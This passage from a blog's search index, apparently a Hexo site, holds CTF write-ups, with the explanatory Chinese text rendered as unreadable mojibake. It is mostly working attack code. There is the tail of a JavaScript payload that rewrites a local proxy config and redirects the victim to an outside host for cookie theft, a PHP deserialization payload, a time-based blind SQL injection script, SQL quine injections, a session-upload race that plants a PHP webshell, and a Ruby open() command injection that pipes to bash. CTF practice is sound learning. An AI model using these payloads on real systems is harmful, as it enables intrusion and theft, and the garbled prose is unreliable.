MATCH,jrxnm\\n&quot;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(config);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        fetch(<span class="string">&quot;http://127.0.0.1:9090/configs&quot;</span>, &#123;</span></span><br><span class="line"><span class="javascript">            method: <span class="string">&#x27;PUT&#x27;</span>, </span></span><br><span class="line"><span class="javascript">            headers: <span class="keyword">new</span> Headers(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line">        &#125;),</span><br><span class="line">            body: config, </span><br><span class="line"><span class="javascript">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> response.text();</span></span><br><span class="line"><span class="javascript">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&quot;error&quot;</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        setConfig();</span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">300</span>);</span></span><br><span class="line"><span class="javascript">        location.href = <span class="string">&quot;http://blog.tomswebsite.com:8888&quot;</span>;</span></span><br><span class="line">    &#125;)();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‹¿æ¥æ”¶åˆ°çš„<code>cookie</code>è§£å¯†ä¹‹åç™»å½•å³å¯è·å–<code>flag</code></p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>ç¬¬äº”ç©ºé—´ 2021</title>
    <url>/2021/09/17/2021%20%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹<a id="more"></a></p>
<h2 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h2><p><code>/readme/mytz.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;act&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;act&#x27;</span>] == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">	phpinfo();</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªæ¢é’ˆé¡µé¢ï¼Œæœä¸€ä¸‹å°±æœ‰<code>flag</code></p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20210916224646064-16318077110751.png" alt="image-20210916224646064"></p>
<h2 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $cinder;  </span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        $file = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    $logData = unserialize($_GET[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $logData; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cinder;</span><br><span class="line">    <span class="keyword">public</span> $neutron;</span><br><span class="line">    <span class="keyword">public</span> $nova;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $openstack;</span><br><span class="line">    <span class="keyword">public</span> $docker;</span><br><span class="line">&#125;</span><br><span class="line">$ace = <span class="keyword">new</span> ace();</span><br><span class="line">$acp = <span class="keyword">new</span> acp();</span><br><span class="line">$abc =  serialize($acp);</span><br><span class="line">$ace-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$ace-&gt;docker = $abc;</span><br><span class="line">$acp-&gt;cinder = $ace;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($acp));</span><br></pre></td></tr></table></figure>

<h2 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params">$mes,$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,$s))&#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $username=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">        alertMes(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] === $password) &#123;</span><br><span class="line">    <span class="keyword">die</span>($FLAG);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alertMes(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹å‘ç°å¯ä»¥æ—¶é—´ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://114.115.143.25:32770&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),&#123;&#125;,1)) like &#123;&#125;),(select benchmark(4999999,md5(&#x27;test&#x27;))),1)#&quot;</span>.format(</span><br><span class="line">            num,i)</span><br><span class="line">        payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">        time1 = datetime.datetime.now()</span><br><span class="line">        r = requests.post(url=url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">            print(<span class="string">&#x27;[+] &#x27;</span>+str(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-] &#x27;</span>+str(i))</span><br><span class="line">        time2 = datetime.datetime.now()</span><br><span class="line">        sec = (time2 - time1).seconds</span><br><span class="line">        <span class="keyword">if</span> (sec &gt; <span class="number">3</span>):</span><br><span class="line">            flag += chr(i)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ³¨å…¥ä¹‹åå‘ç°<code>user</code>æ˜¯ç©ºè¡¨ï¼Œç”¨<code>quine</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;pass#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;pass#&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;pass#</span><br><span class="line"></span><br><span class="line">&#39;union(select(replace(replace(&#39;&quot;union(select(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;,char(34),char(39)),char(46),&#39;&quot;union(select(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;)))#</span><br></pre></td></tr></table></figure>

<h2 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    $shell = $_GET[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $shell;</span><br><span class="line">    <span class="keyword">if</span>(strlen($shell) &gt; <span class="number">15</span> | filter($shell) | checkNums($shell)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>($shell);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter($_GET[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $banned = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($banned <span class="keyword">as</span> $ban)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr($var, $ban)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $alphanum = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    $cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($alphanum); $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($var); $j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>($var[$j] == $alphanum[$i])&#123;</span><br><span class="line">                $cnt += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>($cnt &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>session upload</code>æ–‡ä»¶åŒ…å«</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://114.115.134.72:32770/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;111.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,</span><br><span class="line">                            data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;111.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<h2 id="PNGå›¾ç‰‡è½¬æ¢å™¨"><a href="#PNGå›¾ç‰‡è½¬æ¢å™¨" class="headerlink" title="PNGå›¾ç‰‡è½¬æ¢å™¨"></a>PNGå›¾ç‰‡è½¬æ¢å™¨</h2><p>é¢˜ç›®ç»™äº†ä¸ªé™„ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  unless params[:file] &amp;&amp; params[:file][:tempfile] &amp;&amp; params[:file][:filename] &amp;&amp; params[:file][:filename].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">-1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  end</span><br><span class="line">  begin</span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |f|</span><br><span class="line">      f.write open(params[:file][:tempfile],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at #&#123;filename&#125;&quot;</span></span><br><span class="line">  rescue</span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  begin</span><br><span class="line">    unless params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    end</span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    unless file.index(<span class="string">&#x27;..&#x27;</span>) == nil &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == nil &amp;&amp; file =~ /^(.+)\.png$/</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    end</span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(/\s*/, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  rescue</span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>å…³é”®çœ‹åˆ°<code>open</code>å‡½æ•°é‚£é‡Œï¼Œå‚è€ƒ</p>
<p><code>https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(&quot;ruby code here&quot;)</span><br><span class="line">system(&quot;os command here&quot;)</span><br><span class="line">&#96;ls -al &#x2F;&#96; # (backticks contain os command)</span><br><span class="line">exec(&quot;os command here&quot;)</span><br><span class="line">open(&quot;\| os command here&quot;)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥åœ¨<code>convert</code>è·¯ç”±æ‹¼æ¥å‘½ä»¤å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;|echo &#39;bHMgLw&#x3D;&#x3D;&#39;|base64 -d|bash&gt;1.png</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
</search>
